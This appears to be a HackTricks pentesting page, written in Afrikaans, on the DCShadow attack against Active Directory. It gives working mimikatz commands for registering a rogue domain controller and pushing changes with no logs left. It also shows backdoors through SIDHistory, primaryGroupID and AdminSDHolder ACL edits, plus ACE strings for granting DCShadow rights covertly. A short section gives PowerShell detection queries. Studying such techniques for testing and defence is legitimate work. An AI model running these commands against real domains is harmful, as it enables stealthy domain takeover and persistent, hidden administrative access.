# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Basiese Inligting

Dit registreer ’n **nuwe Domain Controller** in die AD en gebruik dit om **attribute** (SIDHistory, SPNs...) op gespesifiseerde objekte te **push**, **sonder** om enige **logs** oor die **wysigings** agter te laat. Jy **benodig DA**-voorregte en moet binne die **worteldomein** wees.\
Let daarop dat redelik lelike logs sal verskyn as jy verkeerde data gebruik.<sup>[[2]](#references)</sup>

Om die aanval uit te voer, benodig jy 2 mimikatz-instanties. Een daarvan sal die RPC-bedieners met SYSTEM-voorregte begin (jy moet hier die wysigings aandui wat jy wil uitvoer), en die ander instansie sal gebruik word om die waardes te push:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Let daarop dat **`elevate::token`** nie in die `mimikatz1`-sessie sal werk nie, aangesien dit die voorregte van die thread verhoog het, maar ons moet die **voorreg van die process** verhoog.\
Jy kan ook ’n "LDAP"-object kies: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Jy kan die veranderinge vanaf ’n DA of vanaf ’n gebruiker met hierdie minimum toestemmings stoot:

- In die **domain object**:
- _DS-Install-Replica_ (Voeg Replica by/Verwyder Replica in Domain)
- _DS-Replication-Manage-Topology_ (Bestuur Replication Topology)
- _DS-Replication-Synchronize_ (Replication Synchronization)
- Die **Sites object** (en sy kinders) in die **Configuration container**:
- _CreateChild and DeleteChild_
- Die object van die **computer wat as ’n DC geregistreer is**:
- _WriteProperty_ (Nie Write nie)
- Die **target object**:
- _WriteProperty_ (Nie Write nie)

Jy kan [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) gebruik om hierdie voorregte aan ’n onbevoorregte gebruiker te gee (let daarop dat dit sommige logs sal laat). Dit is baie meer beperkend as om DA-voorregte te hê.\
Byvoorbeeld: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Dit beteken dat die username _**student1**_ wanneer dit op die machine _**mcorp-student1**_ aangemeld is, DCShadow-permissies oor die object _**root1user**_ het.

## Gebruik DCShadow om backdoors te skep
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Misbruik van primêre groepe, enumerasiegapings en opsporing

- `primaryGroupID` is 'n aparte attribute van die groep se `member`-lys. DCShadow/DSInternals kan dit direk skryf (byvoorbeeld, stel `primaryGroupID=512` vir **Domain Admins**) sonder on-box LSASS enforcement, maar AD **verskuif** steeds die user: wanneer PGID verander word, verwyder AD altyd lidmaatskap uit die vorige primêre groep (dieselfde gedrag vir enige teikengroep), dus kan jy nie die ou primêre-groep-lidmaatskap behou nie.<sup>[[1]](#references)</sup>
- Verstektools voorkom dat 'n user uit sy huidige primêre groep verwyder word (`ADUC`, `Remove-ADGroupMember`), dus vereis die verandering van PGID tipies direkte directory writes (DCShadow/`Set-ADDBPrimaryGroup`).
- Lidmaatskaprapportering is inkonsekwent:
- **Sluit lede in wat deur primêre groepe afgelei word:** `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Laat lede uit wat deur primêre groepe afgelei word:** `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit wat `member` inspekteer, `Get-ADUser <user> -Properties memberOf`.
- Rekursiewe kontroles kan lede van primêre groepe mis as die **primêre groep self genest is** (byvoorbeeld, user se PGID wys na 'n geneste groep binne Domain Admins); `Get-ADGroupMember -Recursive` of LDAP recursive filters sal daardie user nie teruggee nie, tensy rekursie primêre groepe eksplisiet oplos.
- DACL-truuks: aanvallers kan **ReadProperty** op `primaryGroupID` by die user (of op die groep se `member`-attribute vir groepe wat nie deur AdminSDHolder beskerm word nie) **deny**, wat effektiewe lidmaatskap vir die meeste PowerShell-navrae verberg; `net group` sal steeds die lidmaatskap oplos. Groepe wat deur AdminSDHolder beskerm word, sal sulke denies terugstel.

Voorbeelde van opsporing/monitering:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Kruiskontroleer bevoorregte groepe deur die `Get-ADGroupMember`-uitset met `Get-ADGroup -Properties member` of ADSI Edit te vergelyk om teenstrydighede op te spoor wat deur `primaryGroupID` of versteekte attribute veroorsaak word.<sup>[[1]](#references)</sup>

## Shadowception - Gee DCShadow-permissies met DCShadow (geen logs van gewysigde permissies nie)

Ons moet die volgende ACEs met ons gebruiker se SID aan die einde byvoeg:<sup>[[2]](#references)</sup>

- Op die domeinobjek:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Op die aanvaller se rekenaarobjek: `(A;;WP;;;UserSID)`
- Op die teikengebruiker-objek: `(A;;WP;;;UserSID)`
- Op die Sites-objek in die Configuration-houer: `(A;CI;CCDC;;;UserSID)`

Om die huidige ACE van ’n objek te kry: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Let daarop dat jy in hierdie geval **verskeie veranderinge** moet maak, nie net een nie. Gebruik dus in die **mimikatz1-sessie** (RPC-bediener) die parameter **`/stack` met elke verandering** wat jy wil maak. Op hierdie manier hoef jy slegs **een keer `/push`** te gebruik om al die opgehoopte veranderinge in die rogue server uit te voer.

[**Meer inligting oor DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)<sup>[[2]](#references)</sup>

## Verwysings

- [1] [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [2] [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
